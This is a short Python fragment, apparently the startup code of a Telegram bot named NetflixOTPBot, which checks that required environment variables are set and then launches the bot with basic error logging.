    required_vars = ["BOT_TOKEN", "ADMIN_ID", "API_ID", "API_HASH", "MONGO_URL"]
    missing_vars = [var for var in required_vars if not os.getenv(var)]
    
    if missing_vars:
        print("❌ Missing environment variables:")
        for var in missing_vars:
            print(f"  • {var}")
        sys.exit(1)
    
    # Create and run bot
    try:
        bot = NetflixOTPBot()
        bot.run()
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        sys.exit(1)
